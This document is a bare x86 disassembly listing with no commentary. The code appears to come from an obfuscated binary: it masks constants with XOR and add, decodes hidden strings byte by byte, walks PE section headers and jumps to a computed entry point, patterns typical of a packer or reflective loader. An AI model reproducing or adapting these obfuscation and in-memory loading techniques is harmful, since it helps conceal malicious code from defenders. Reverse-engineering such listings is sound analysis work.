  41ef42:	mov    DWORD PTR [ebp-0x68],eax
  41ef45:	mov    DWORD PTR [ebp-0x64],eax
  41ef48:	lea    eax,[ecx-0x1]
  41ef4b:	mov    edx,0xf89c85ff
  41ef50:	mov    DWORD PTR [ebp-0x58],eax
  41ef53:	mov    DWORD PTR [ebp-0x54],eax
  41ef56:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  41ef60:	mov    DWORD PTR [ebp-0xa0],ecx
  41ef66:	mov    DWORD PTR [ebp-0x9c],edx
  41ef6c:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  41ef76:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41ef80:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  41ef8a:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41ef94:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  41ef9e:	mov    DWORD PTR [ebp-0x80],ecx
  41efa1:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41efa8:	mov    DWORD PTR [ebp-0x78],edx
  41efab:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  41efb2:	mov    DWORD PTR [ebp-0x70],ecx
  41efb5:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  41efbc:	mov    DWORD PTR [ebp-0x60],ecx
  41efbf:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41efc6:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  41efcd:	xor    eax,eax
  41efcf:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41efd6:	xor    cl,0x9b
  41efd9:	sub    cl,0x1e
  41efdc:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41efe3:	inc    eax
  41efe4:	cmp    eax,0x17
  41efe7:	jb     0x41efcf
  41efe9:	mov    eax,DWORD PTR [ebx+0x1d8]
  41efef:	lea    ecx,[ebp-0xb4]
  41eff5:	push   ecx
  41eff6:	call   DWORD PTR [eax+0x4]
  41eff9:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41efff:	lea    edx,[ebp-0xcc]
  41f005:	push   edx
  41f006:	push   eax
  41f007:	call   DWORD PTR [ecx+0x8]
  41f00a:	lea    ecx,[ebp-0x28]
  41f00d:	push   ecx
  41f00e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f014:	push   DWORD PTR [ecx]
  41f016:	call   eax
  41f018:	mov    eax,DWORD PTR [ebp-0x28]
  41f01b:	test   eax,eax
  41f01d:	je     0x41f059
  41f01f:	mov    DWORD PTR [ebp+0x8],eax
  41f022:	jmp    0x41f02e
  41f024:	mov    eax,DWORD PTR [eax]
  41f026:	mov    DWORD PTR [ebp-0x28],eax
  41f029:	cmp    eax,DWORD PTR [ebp+0x8]
  41f02c:	je     0x41f03b
  41f02e:	mov    edx,DWORD PTR [eax+0x18]
  41f031:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f037:	cmp    edx,DWORD PTR [ecx]
  41f039:	jne    0x41f024
  41f03b:	mov    edx,DWORD PTR [eax+0x18]
  41f03e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f044:	cmp    edx,DWORD PTR [ecx]
  41f046:	jne    0x41f059
  41f048:	mov    edx,DWORD PTR [ebp-0x18]
  41f04b:	mov    ecx,DWORD PTR [ebx+0x190]
  41f051:	mov    edx,DWORD PTR [edx+0x28]
  41f054:	add    edx,DWORD PTR [ecx]
  41f056:	mov    DWORD PTR [eax+0x1c],edx
  41f059:	mov    eax,DWORD PTR [ebp+0xc]
  41f05c:	push   ebx
  41f05d:	push   eax
  41f05e:	push   DWORD PTR [ebp+0x20]
  41f061:	call   0x41e80b
  41f066:	test   eax,eax
  41f068:	je     0x41f131
  41f06e:	push   DWORD PTR [ebp+0xc]
  41f071:	mov    ecx,ebx
  41f073:	push   DWORD PTR [ebp+0x20]
  41f076:	call   0x41e764
  41f07b:	test   eax,eax
  41f07d:	je     0x41f131
  41f083:	mov    eax,DWORD PTR [ebp+0xc]
  41f086:	mov    edx,DWORD PTR [ebp+0x20]
  41f089:	mov    ecx,ebx
  41f08b:	call   0x41e63d
  41f090:	test   eax,eax
  41f092:	je     0x41f131
  41f098:	push   ebx
  41f099:	push   DWORD PTR [ebp+0x20]
  41f09c:	call   0x41eaee
  41f0a1:	test   eax,eax
  41f0a3:	je     0x41f131
  41f0a9:	mov    eax,DWORD PTR [ebx+0x18c]
  41f0af:	mov    edx,DWORD PTR [ebp+0x20]
  41f0b2:	cmp    edx,DWORD PTR [eax]
  41f0b4:	jne    0x41f0d0
  41f0b6:	mov    eax,DWORD PTR [ebx+0x1d8]
  41f0bc:	lea    ecx,[ebp-0x1c]
  41f0bf:	push   ecx
  41f0c0:	push   DWORD PTR [ebp-0x1c]
  41f0c3:	mov    ecx,DWORD PTR [ebp-0x18]
  41f0c6:	push   DWORD PTR [ecx+0x54]
  41f0c9:	push   edx
  41f0ca:	call   DWORD PTR [eax+0x1c]
  41f0cd:	mov    edx,DWORD PTR [ebp+0x20]
  41f0d0:	mov    eax,DWORD PTR [ebx+0x1c8]
  41f0d6:	mov    eax,DWORD PTR [eax]
  41f0d8:	xor    eax,esi
  41f0da:	add    eax,edi
  41f0dc:	je     0x41f115
  41f0de:	mov    ecx,DWORD PTR [ebp+0xc]
  41f0e1:	mov    eax,DWORD PTR [ecx+0x28]
  41f0e4:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  41f0eb:	mov    esi,DWORD PTR [ebp+0x8]
  41f0ee:	push   DWORD PTR [ebp+0x14]
  41f0f1:	xor    esi,0x89b
  41f0f7:	push   DWORD PTR [ebp+0x10]
  41f0fa:	add    esi,0x72e2
  41f100:	or     WORD PTR [ecx+0x16],si
  41f104:	add    eax,edx
  41f106:	push   edx
  41f107:	call   eax
  41f109:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41f113:	jmp    0x41f11f
  41f115:	mov    eax,DWORD PTR [ebp+0xc]
  41f118:	mov    eax,DWORD PTR [eax+0x28]
  41f11b:	add    eax,edx
  41f11d:	call   eax
  41f11f:	mov    DWORD PTR [ebp-0x8],eax
  41f122:	mov    eax,DWORD PTR [ebp-0x8]
  41f125:	mov    ecx,DWORD PTR [ebp+0x1c]
  41f128:	mov    DWORD PTR [ecx],eax
  41f12a:	mov    DWORD PTR [ebp-0x30],0x1
  41f131:	cmp    DWORD PTR [ebp-0x30],0x0
  41f135:	jne    0x41f13b
  41f137:	and    DWORD PTR [ebp+0x20],0x0
  41f13b:	mov    eax,DWORD PTR [ebp+0x20]
  41f13e:	jmp    0x41f142
  41f140:	xor    eax,eax
  41f142:	pop    edi
  41f143:	pop    esi
  41f144:	pop    ebx
  41f145:	leave  
  41f146:	ret    0x1c
  41f149:	push   ebp
  41f14a:	mov    ebp,esp
  41f14c:	movzx  edx,WORD PTR [ecx+0x6]
  41f150:	movzx  eax,WORD PTR [ecx+0x14]
  41f154:	push   ebx
  41f155:	push   edi
  41f156:	xor    edi,edi
  41f158:	lea    eax,[eax+ecx*1+0x18]
  41f15c:	test   edx,edx
  41f15e:	je     0x41f17f
  41f160:	mov    ecx,DWORD PTR [eax+0xc]
  41f163:	lea    ebx,[ecx+esi*1]
  41f166:	cmp    DWORD PTR [ebp+0x8],ebx
  41f169:	jb     0x41f177
  41f16b:	mov    ebx,DWORD PTR [eax+0x8]
  41f16e:	add    ebx,ecx
  41f170:	add    ebx,esi
  41f172:	cmp    DWORD PTR [ebp+0x8],ebx
  41f175:	jb     0x41f181
  41f177:	add    eax,0x28
  41f17a:	inc    edi
  41f17b:	cmp    edi,edx
  41f17d:	jb     0x41f160
  41f17f:	xor    eax,eax
  41f181:	pop    edi
  41f182:	pop    ebx
  41f183:	pop    ebp
  41f184:	ret    0x4
  41f187:	push   ebp
  41f188:	mov    ebp,esp
  41f18a:	sub    esp,0x34
  41f18d:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41f194:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f19b:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  41f1a2:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  41f1a9:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  41f1b0:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  41f1b7:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  41f1be:	mov    DWORD PTR [ebp-0x10],eax
  41f1c1:	mov    eax,DWORD PTR [ebp+0x8]
  41f1c4:	mov    DWORD PTR [ebp-0x14],eax
  41f1c7:	mov    eax,DWORD PTR [ebp-0xc]
  41f1ca:	push   ebx
  41f1cb:	mov    ecx,0x751089b
  41f1d0:	xor    eax,ecx
  41f1d2:	push   esi
  41f1d3:	mov    esi,DWORD PTR [ebp-0x10]
  41f1d6:	mov    edx,0x3272e2
  41f1db:	add    eax,edx
  41f1dd:	push   edi
  41f1de:	cmp    esi,eax
  41f1e0:	je     0x41f3bf
  41f1e6:	mov    eax,DWORD PTR [ebp-0xc]
  41f1e9:	mov    esi,DWORD PTR [ebp-0x14]
  41f1ec:	xor    eax,ecx
  41f1ee:	add    eax,edx
  41f1f0:	cmp    esi,eax
  41f1f2:	je     0x41f3bf
  41f1f8:	mov    eax,DWORD PTR [ebp-0xc]
  41f1fb:	xor    eax,ecx
  41f1fd:	add    eax,edx
  41f1ff:	mov    DWORD PTR [ebp-0x24],eax
  41f202:	mov    eax,DWORD PTR [ebp-0xc]
  41f205:	xor    eax,ecx
  41f207:	add    eax,edx
  41f209:	mov    DWORD PTR [ebp-0x28],eax
  41f20c:	mov    edi,DWORD PTR [ebp-0x20]
  41f20f:	mov    ebx,DWORD PTR [ebp-0x8]
  41f212:	mov    esi,0x89b
  41f217:	xor    edi,esi
  41f219:	mov    eax,0x72e2
  41f21e:	xor    ebx,esi
  41f220:	add    edi,eax
  41f222:	add    ebx,eax
  41f224:	sub    ebx,edi
  41f226:	mov    WORD PTR [ebp-0x8],bx
  41f22a:	jmp    0x41f2ef
  41f22f:	mov    edi,DWORD PTR [ebp-0xc]
  41f232:	mov    bx,WORD PTR [ebp-0x4]
  41f236:	xor    edi,esi
  41f238:	add    edi,eax
  41f23a:	cmp    bx,di
  41f23d:	je     0x41f331
  41f243:	mov    edi,DWORD PTR [ebp-0xc]
  41f246:	mov    ebx,DWORD PTR [ebp+0xc]
  41f249:	xor    edi,ecx
  41f24b:	add    edi,edx
  41f24d:	cmp    ebx,edi
  41f24f:	mov    di,WORD PTR [ebp-0x4]
  41f253:	mov    bx,WORD PTR [ebp+0x8]
  41f257:	je     0x41f2c2
  41f259:	cmp    bx,di
  41f25c:	je     0x41f2cb
  41f25e:	mov    edi,DWORD PTR [ebp-0x20]
  41f261:	mov    bx,WORD PTR [ebp+0x8]
  41f265:	xor    edi,esi
  41f267:	add    edi,eax
  41f269:	cmp    bx,di
  41f26c:	jb     0x41f28c
  41f26e:	mov    edi,DWORD PTR [ebp-0x2c]
  41f271:	mov    bx,WORD PTR [ebp+0x8]
  41f275:	xor    edi,esi
  41f277:	add    edi,eax
  41f279:	cmp    bx,di
  41f27c:	ja     0x41f28c
  41f27e:	movzx  edi,WORD PTR [ebp+0x8]
  41f282:	movzx  ebx,WORD PTR [ebp-0x8]
  41f286:	add    edi,ebx
  41f288:	mov    WORD PTR [ebp+0x8],di
  41f28c:	mov    edi,DWORD PTR [ebp-0x20]
  41f28f:	mov    bx,WORD PTR [ebp-0x4]
  41f293:	xor    edi,esi
  41f295:	add    edi,eax
  41f297:	cmp    bx,di
  41f29a:	jb     0x41f2ba
  41f29c:	mov    edi,DWORD PTR [ebp-0x2c]
  41f29f:	mov    bx,WORD PTR [ebp-0x4]
  41f2a3:	xor    edi,esi
  41f2a5:	add    edi,eax
  41f2a7:	cmp    bx,di
  41f2aa:	ja     0x41f2ba
  41f2ac:	movzx  edi,WORD PTR [ebp-0x4]
  41f2b0:	movzx  ebx,WORD PTR [ebp-0x8]
  41f2b4:	add    edi,ebx
  41f2b6:	mov    WORD PTR [ebp-0x4],di
  41f2ba:	mov    di,WORD PTR [ebp-0x4]
  41f2be:	mov    bx,WORD PTR [ebp+0x8]
  41f2c2:	cmp    bx,di
  41f2c5:	jne    0x41f3bf
  41f2cb:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2ce:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2d1:	xor    edi,ecx
  41f2d3:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2da:	mov    DWORD PTR [ebp-0x10],edi
  41f2dd:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2e0:	mov    ebx,DWORD PTR [ebp-0x14]
  41f2e3:	xor    edi,ecx
  41f2e5:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2ec:	mov    DWORD PTR [ebp-0x14],edi
  41f2ef:	mov    edi,DWORD PTR [ebp-0x24]
  41f2f2:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2f5:	mov    di,WORD PTR [ebx+edi*2]
  41f2f9:	mov    WORD PTR [ebp+0x8],di
  41f2fd:	mov    edi,DWORD PTR [ebp-0x28]
  41f300:	mov    ebx,DWORD PTR [ebp-0x14]
  41f303:	mov    di,WORD PTR [ebx+edi*2]
  41f307:	mov    WORD PTR [ebp-0x4],di
  41f30b:	mov    edi,DWORD PTR [ebp-0xc]
  41f30e:	mov    bx,WORD PTR [ebp+0x8]
  41f312:	xor    edi,esi
  41f314:	add    edi,eax
  41f316:	cmp    bx,di
  41f319:	jne    0x41f22f
  41f31f:	mov    eax,DWORD PTR [ebp-0x18]
  41f322:	mov    esi,DWORD PTR [ebp-0xc]
  41f325:	xor    eax,ecx
  41f327:	add    eax,edx
  41f329:	imul   eax,esi
  41f32c:	mov    DWORD PTR [ebp-0xc],eax
  41f32f:	jmp    0x41f343
  41f331:	mov    eax,DWORD PTR [ebp-0xc]
  41f334:	mov    esi,DWORD PTR [ebp-0x18]
  41f337:	xor    eax,ecx
  41f339:	lea    eax,[eax+esi*1+0x3272e2]
  41f340:	mov    DWORD PTR [ebp-0x18],eax
  41f343:	mov    eax,DWORD PTR [ebp-0x24]
  41f346:	sub    eax,edx
  41f348:	xor    eax,ecx
  41f34a:	mov    DWORD PTR [ebp-0x30],eax
  41f34d:	mov    eax,DWORD PTR [ebp-0x28]
  41f350:	sub    eax,edx
  41f352:	xor    eax,ecx
  41f354:	mov    DWORD PTR [ebp-0x34],eax
  41f357:	mov    eax,DWORD PTR [ebp-0x34]
  41f35a:	mov    esi,DWORD PTR [ebp-0x1c]
  41f35d:	xor    esi,ecx
  41f35f:	add    esi,edx
  41f361:	xor    eax,ecx
  41f363:	add    eax,0x3272e2
  41f368:	imul   esi,eax
  41f36b:	mov    eax,DWORD PTR [ebp-0x14]
  41f36e:	movzx  eax,WORD PTR [esi+eax*1]
  41f372:	mov    esi,DWORD PTR [ebp-0x30]
  41f375:	mov    edi,DWORD PTR [ebp-0x1c]
  41f378:	xor    esi,ecx
  41f37a:	add    esi,edx
  41f37c:	xor    edi,ecx
  41f37e:	add    edi,edx
  41f380:	imul   edi,esi
  41f383:	mov    esi,DWORD PTR [ebp-0x10]
  41f386:	movzx  esi,WORD PTR [edi+esi*1]
  41f38a:	sub    eax,edx
  41f38c:	sub    esi,edx
  41f38e:	xor    eax,ecx
  41f390:	xor    esi,ecx
  41f392:	cmp    esi,eax
  41f394:	jne    0x41f3bf
  41f396:	mov    eax,DWORD PTR [ebp-0x30]
  41f399:	mov    esi,DWORD PTR [ebp-0x1c]
  41f39c:	xor    eax,ecx
  41f39e:	add    eax,0x3272e2
  41f3a3:	xor    esi,ecx
  41f3a5:	add    esi,edx
  41f3a7:	imul   esi,eax
  41f3aa:	mov    eax,DWORD PTR [ebp-0x10]
  41f3ad:	movzx  eax,WORD PTR [esi+eax*1]
  41f3b1:	mov    esi,DWORD PTR [ebp-0xc]
  41f3b4:	sub    eax,edx
  41f3b6:	xor    eax,ecx
  41f3b8:	cmp    eax,esi
  41f3ba:	mov    eax,DWORD PTR [ebp-0xc]
  41f3bd:	je     0x41f3c2
  41f3bf:	mov    eax,DWORD PTR [ebp-0x18]
  41f3c2:	pop    edi
  41f3c3:	xor    eax,ecx
  41f3c5:	pop    esi
  41f3c6:	add    eax,edx
  41f3c8:	pop    ebx
  41f3c9:	leave  
  41f3ca:	ret    0x8
  41f3cd:	push   ebp
  41f3ce:	mov    ebp,esp
  41f3d0:	push   ecx
  41f3d1:	mov    cx,WORD PTR [eax]
  41f3d4:	push   esi
  41f3d5:	mov    esi,0x3b51
  41f3da:	sub    cx,si
  41f3dd:	mov    esi,0x8a8d
  41f3e2:	xor    cx,si
  41f3e5:	mov    esi,0x4e22
  41f3ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f3f1:	mov    edx,0xf89c8585
  41f3f6:	cmp    cx,si
  41f3f9:	je     0x41f458
  41f3fb:	push   ebx
  41f3fc:	push   edi
  41f3fd:	movzx  ecx,cx
  41f400:	mov    edi,0xffcd8d1e
  41f405:	mov    esi,0x751089b
  41f40a:	mov    ebx,0x4f86
  41f40f:	cmp    cx,bx
  41f412:	jne    0x41f417
  41f414:	mov    DWORD PTR [ebp-0x4],edx
  41f417:	lea    edx,[edi+0x1]
  41f41a:	xor    edx,esi
  41f41c:	mov    edi,edx
  41f41e:	xor    edi,esi
  41f420:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  41f428:	mov    ebx,0x3b51
  41f42d:	sub    cx,bx
  41f430:	mov    ebx,0x8a8d
  41f435:	xor    cx,bx
  41f438:	mov    ebx,0x4e22
  41f43d:	cmp    cx,bx
  41f440:	jne    0x41f40a
  41f442:	mov    ecx,DWORD PTR [ebp-0x4]
  41f445:	pop    edi
  41f446:	pop    ebx
  41f447:	cmp    ecx,0xf89c8586
  41f44d:	je     0x41f458
  41f44f:	xor    ecx,esi
  41f451:	lea    eax,[eax+ecx*2+0x64e5c6]
  41f458:	pop    esi
  41f459:	leave  
  41f45a:	ret    
  41f45b:	push   ebp
  41f45c:	mov    ebp,esp
  41f45e:	push   ecx
  41f45f:	push   esi
  41f460:	push   edi
  41f461:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f468:	mov    esi,0xf89c8585
  41f46d:	call   0x41f3cd
  41f472:	mov    edi,eax
  41f474:	mov    al,BYTE PTR [edi]
  41f476:	add    al,0x8
  41f478:	xor    al,0x74
  41f47a:	cmp    al,0x7c
  41f47c:	je     0x41f4df
  41f47e:	mov    eax,edi
  41f480:	mov    edx,0xffcd8d1e
  41f485:	mov    ecx,0x751089b
  41f48a:	push   ebx
  41f48b:	mov    ax,WORD PTR [eax]
  41f48e:	mov    ebx,0x3b51
  41f493:	sub    ax,bx
  41f496:	mov    ebx,0x8a8d
  41f49b:	xor    ax,bx
  41f49e:	mov    ebx,0x4e50
  41f4a3:	cmp    ax,bx
  41f4a6:	jne    0x41f4ab
  41f4a8:	mov    DWORD PTR [ebp-0x4],esi
  41f4ab:	lea    esi,[edx+0x1]
  41f4ae:	xor    esi,ecx
  41f4b0:	mov    edx,esi
  41f4b2:	xor    edx,ecx
  41f4b4:	lea    eax,[edi+edx*2+0x64e5c4]
  41f4bb:	mov    bl,BYTE PTR [eax]
  41f4bd:	add    bl,0x8
  41f4c0:	xor    bl,0x74
  41f4c3:	cmp    bl,0x7c
  41f4c6:	jne    0x41f48b
  41f4c8:	mov    eax,DWORD PTR [ebp-0x4]
  41f4cb:	pop    ebx
  41f4cc:	cmp    eax,0xf89c8586
  41f4d1:	je     0x41f4df
  41f4d3:	xor    eax,ecx
  41f4d5:	xor    ecx,ecx
  41f4d7:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  41f4df:	mov    eax,edi
  41f4e1:	pop    edi
  41f4e2:	pop    esi
  41f4e3:	leave  
  41f4e4:	ret    
  41f4e5:	push   ebp
  41f4e6:	mov    ebp,esp
  41f4e8:	push   ecx
  41f4e9:	push   esi
  41f4ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f4f1:	mov    esi,0xf89c8585
  41f4f6:	call   0x41f3cd
  41f4fb:	mov    cx,WORD PTR [eax]
  41f4fe:	mov    edx,0x3b51
  41f503:	sub    cx,dx
  41f506:	mov    edx,0x8a8d
  41f50b:	xor    cx,dx
  41f50e:	mov    edx,0x4e22
  41f513:	cmp    cx,dx
  41f516:	je     0x41f56f
  41f518:	push   ebx
  41f519:	push   edi
  41f51a:	movzx  ecx,cx
  41f51d:	mov    edx,0xffcd8d1e
  41f522:	mov    edi,0x751089b
  41f527:	mov    ebx,0x4e50
  41f52c:	cmp    cx,bx
  41f52f:	jne    0x41f534
  41f531:	mov    DWORD PTR [ebp-0x4],esi
  41f534:	lea    esi,[edx+0x1]
  41f537:	xor    esi,edi
  41f539:	mov    edx,esi
  41f53b:	xor    edx,edi
  41f53d:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  41f545:	mov    ebx,0x3b51
  41f54a:	sub    cx,bx
  41f54d:	mov    ebx,0x8a8d
  41f552:	xor    cx,bx
  41f555:	mov    ebx,0x4e22
  41f55a:	cmp    cx,bx
  41f55d:	jne    0x41f527
  41f55f:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41f566:	pop    edi
  41f567:	pop    ebx
  41f568:	je     0x41f56f
  41f56a:	xor    eax,eax
  41f56c:	inc    eax
  41f56d:	jmp    0x41f571
  41f56f:	xor    eax,eax
  41f571:	pop    esi
  41f572:	leave  
  41f573:	ret    
  41f574:	push   ebp
  41f575:	mov    ebp,esp
  41f577:	push   ecx
  41f578:	mov    eax,DWORD PTR [ebp+0x8]
  41f57b:	movzx  ecx,WORD PTR [eax]
  41f57e:	push   esi
  41f57f:	lea    eax,[ecx-0x3b51]
  41f585:	mov    esi,0x8a8d
  41f58a:	push   edi
  41f58b:	xor    eax,esi
  41f58d:	mov    edi,0x4e22
  41f592:	mov    DWORD PTR [ebp-0x4],edx
  41f595:	cmp    ax,di
  41f598:	je     0x41f5c5
  41f59a:	mov    eax,DWORD PTR [ebp+0x8]
  41f59d:	sub    eax,edx
  41f59f:	mov    DWORD PTR [ebp+0x8],eax
  41f5a2:	jmp    0x41f5a7
  41f5a4:	mov    eax,DWORD PTR [ebp+0x8]
  41f5a7:	mov    WORD PTR [edx],cx
  41f5aa:	add    edx,0x2
  41f5ad:	movzx  edi,WORD PTR [eax+edx*1]
  41f5b1:	mov    ecx,edi
  41f5b3:	add    edi,0xffffc4af
  41f5b9:	xor    edi,esi
  41f5bb:	mov    eax,0x4e22
  41f5c0:	cmp    di,ax
  41f5c3:	jne    0x41f5a4
  41f5c5:	xor    eax,eax
  41f5c7:	pop    edi
  41f5c8:	mov    WORD PTR [edx],ax
  41f5cb:	mov    eax,DWORD PTR [ebp-0x4]
  41f5ce:	pop    esi
  41f5cf:	leave  
  41f5d0:	ret    0x4
  41f5d3:	push   ebp
  41f5d4:	mov    ebp,esp
  41f5d6:	sub    esp,0x18
  41f5d9:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41f5e0:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f5e7:	mov    eax,DWORD PTR [ebp-0x14]
  41f5ea:	xor    eax,0x751089b
  41f5ef:	add    eax,0x3272e2
  41f5f4:	mov    DWORD PTR [ebp-0x8],eax
  41f5f7:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41f5fe:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41f605:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  41f60c:	mov    eax,DWORD PTR [ebp-0x14]
  41f60f:	xor    eax,0x751089b
  41f614:	mov    ecx,DWORD PTR [ebp-0x8]
  41f617:	lea    eax,[ecx+eax*1+0x3272e2]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x18]
  41f621:	xor    ecx,0x751089b
  41f627:	add    ecx,0x3272e2
  41f62d:	mov    edx,DWORD PTR [ebp+0x10]
  41f630:	imul   edx,ecx
  41f633:	cmp    eax,edx
  41f635:	jae    0x41f728
  41f63b:	mov    eax,DWORD PTR [ebp+0x10]
  41f63e:	mov    ecx,DWORD PTR [ebp-0x8]
  41f641:	sub    eax,ecx
  41f643:	mov    ecx,DWORD PTR [ebp-0x10]
  41f646:	xor    ecx,0x751089b
  41f64c:	add    ecx,0x3272e2
  41f652:	cmp    eax,ecx
  41f654:	jbe    0x41f686
  41f656:	mov    eax,DWORD PTR [ebp+0x8]
  41f659:	add    eax,DWORD PTR [ebp-0x8]
  41f65c:	mov    ecx,DWORD PTR [ebp+0xc]
  41f65f:	add    ecx,DWORD PTR [ebp-0x8]
  41f662:	mov    edx,DWORD PTR [ecx]
  41f664:	mov    DWORD PTR [eax],edx
  41f666:	mov    ecx,DWORD PTR [ecx+0x4]
  41f669:	mov    DWORD PTR [eax+0x4],ecx
  41f66c:	mov    eax,DWORD PTR [ebp-0x10]
  41f66f:	xor    eax,0x751089b
  41f674:	mov    ecx,DWORD PTR [ebp-0x8]
  41f677:	lea    eax,[ecx+eax*1+0x3272e2]
  41f67e:	mov    DWORD PTR [ebp-0x8],eax
  41f681:	jmp    0x41f723
  41f686:	mov    eax,DWORD PTR [ebp+0x10]
  41f689:	mov    ecx,DWORD PTR [ebp-0x8]
  41f68c:	sub    eax,ecx
  41f68e:	mov    ecx,DWORD PTR [ebp-0xc]
  41f691:	xor    ecx,0x751089b
  41f697:	add    ecx,0x3272e2
  41f69d:	cmp    eax,ecx
  41f69f:	jbe    0x41f6c8
  41f6a1:	mov    eax,DWORD PTR [ebp+0x8]
  41f6a4:	add    eax,DWORD PTR [ebp-0x8]
  41f6a7:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6aa:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ad:	mov    ecx,DWORD PTR [ecx]
  41f6af:	mov    DWORD PTR [eax],ecx
  41f6b1:	mov    eax,DWORD PTR [ebp-0xc]
  41f6b4:	xor    eax,0x751089b
  41f6b9:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6bc:	lea    eax,[ecx+eax*1+0x3272e2]
  41f6c3:	mov    DWORD PTR [ebp-0x8],eax
  41f6c6:	jmp    0x41f723
  41f6c8:	mov    eax,DWORD PTR [ebp+0x10]
  41f6cb:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6ce:	sub    eax,ecx
  41f6d0:	mov    ecx,DWORD PTR [ebp-0x4]
  41f6d3:	xor    ecx,0x751089b
  41f6d9:	add    ecx,0x3272e2
  41f6df:	cmp    eax,ecx
  41f6e1:	jbe    0x41f70c
  41f6e3:	mov    eax,DWORD PTR [ebp+0x8]
  41f6e6:	add    eax,DWORD PTR [ebp-0x8]
  41f6e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6ec:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ef:	mov    cx,WORD PTR [ecx]
  41f6f2:	mov    WORD PTR [eax],cx
  41f6f5:	mov    eax,DWORD PTR [ebp-0x4]
  41f6f8:	xor    eax,0x751089b
  41f6fd:	mov    ecx,DWORD PTR [ebp-0x8]
  41f700:	lea    eax,[ecx+eax*1+0x3272e2]
  41f707:	mov    DWORD PTR [ebp-0x8],eax
  41f70a:	jmp    0x41f723
  41f70c:	mov    eax,DWORD PTR [ebp+0x8]
  41f70f:	add    eax,DWORD PTR [ebp-0x8]
  41f712:	mov    ecx,DWORD PTR [ebp+0xc]
  41f715:	add    ecx,DWORD PTR [ebp-0x8]
  41f718:	mov    cl,BYTE PTR [ecx]
  41f71a:	mov    BYTE PTR [eax],cl
  41f71c:	mov    eax,DWORD PTR [ebp-0x8]
  41f71f:	inc    eax
  41f720:	mov    DWORD PTR [ebp-0x8],eax
  41f723:	jmp    0x41f60c
  41f728:	leave  
  41f729:	ret    0xc
  41f72c:	push   ebp
  41f72d:	mov    ebp,esp
  41f72f:	sub    esp,0xc
  41f732:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f739:	push   esi
  41f73a:	mov    esi,eax
  41f73c:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41f743:	mov    edx,DWORD PTR [ebp-0x4]
  41f746:	mov    eax,0x751089b
  41f74b:	xor    edx,eax
  41f74d:	mov    ecx,0x3272e2
  41f752:	add    edx,ecx
  41f754:	cmp    esi,edx
  41f756:	je     0x41f798
  41f758:	push   ebx
  41f759:	push   edi
  41f75a:	mov    edx,DWORD PTR [ebp-0x8]
  41f75d:	mov    ebx,DWORD PTR [ebp+0x8]
  41f760:	xor    edx,eax
  41f762:	mov    edi,0xffcd8d1e
  41f767:	sub    edi,edx
  41f769:	add    esi,edi
  41f76b:	lea    edx,[esi-0x3272e2]
  41f771:	xor    edx,eax
  41f773:	mov    DWORD PTR [ebp-0xc],edx
  41f776:	mov    edx,DWORD PTR [ebp-0x4]
  41f779:	mov    edi,DWORD PTR [ebp-0xc]
  41f77c:	xor    dl,0x9b
  41f77f:	sub    dl,0x1e
  41f782:	xor    edi,eax
  41f784:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  41f78b:	mov    edx,DWORD PTR [ebp-0x4]
  41f78e:	xor    edx,eax
  41f790:	add    edx,ecx
  41f792:	cmp    esi,edx
  41f794:	jne    0x41f75a
  41f796:	pop    edi
  41f797:	pop    ebx
  41f798:	pop    esi
  41f799:	leave  
  41f79a:	ret    0x4
  41f79d:	push   ebp
  41f79e:	mov    ebp,esp
  41f7a0:	sub    esp,0x21c
  41f7a6:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f7ad:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41f7b4:	mov    eax,DWORD PTR [ebp+0x10]
  41f7b7:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ba:	mov    ecx,DWORD PTR [ebp+0x8]
  41f7bd:	push   esi
  41f7be:	push   edi
